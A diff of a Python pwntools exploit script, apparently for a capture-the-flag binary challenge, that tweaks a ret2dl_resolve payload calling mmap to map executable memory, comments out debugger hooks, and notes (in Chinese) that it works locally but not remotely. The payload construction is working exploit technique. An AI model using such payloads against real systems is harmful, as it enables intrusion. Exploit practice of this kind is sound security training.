@@ -4,12 +4,8 @@
 
 """
 @author: starvii
-如果依赖特定版本的libc，请使用patchelf对可执行文件修改
-例如，使用x64的2.23版本的libc，
 
-patchelf --set-interpreter /glibc/2.23/64/lib/ld-linux-x86-64.so.2 <binary>
-patchelf --replace-needed libc.so.6 /glibc/2.23/64/lib/libc.so.6 <binary>
-
+mmap 本地成功，远程未能成功
 """
 
 import re
@@ -99,11 +95,11 @@ def main():
     target_addr = 0x1000000
     payload = flat((
         PADDING,
-        call6(dl_resolve_addr, mmap_addr, elf.sym["_start"], (target_addr, 0x1000, 7, 0x100 | 0x2, -1, 0)),
+        call6(dl_resolve_addr, mmap_addr, elf.sym["_start"], (target_addr, 0x1000, 7, 0x22, -1, 0)),
     ))
 
-    gdb.attach(io, gdbscript="b *0x400619")
-    pause()
+    # gdb.attach(io, gdbscript="b *0x400619")
+    # pause()
 
     io.sendafter(":\n", payload)
     payload = flat((
